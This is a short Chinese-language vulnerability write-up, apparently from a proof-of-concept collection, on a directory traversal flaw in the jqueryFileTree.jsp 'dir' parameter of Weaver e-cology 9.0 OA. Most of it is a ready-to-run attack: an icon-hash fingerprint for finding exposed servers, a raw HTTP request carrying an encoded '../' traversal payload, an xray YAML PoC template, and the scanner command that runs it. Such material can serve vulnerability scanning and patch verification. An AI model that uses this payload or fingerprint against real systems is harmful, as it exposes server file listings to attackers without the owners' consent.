# 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞
## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息
## 影响版本
```
泛微e-cology 9.0
```

## 网络测绘
```
icon_hash="1578525679"
```

## 环境搭建

-

## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201225783.png)


## 数据包
```
GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/%2e%2e/%2e%2e/ HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

## YAML代码
```
name: poc-yaml-ecology-jqueryfiletree-dt
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: ^/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
      # path: ^/test
    expression: response.status == 200 && response.body.bcontains(b'index.jsp') && response.body.bcontains(b'PortalCenter.jsp') && response.body.bcontains(b'PortalSettingOperation.jsp')
expression: r0()
detail:
  author: klear
  links:
    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20jqueryFileTree.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html


```

## xray调用

```
xray ws --poc poc-yaml-ecology-jqueryFileTree-DT.yml --url xxx --html-output test.html

```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201224304.png)
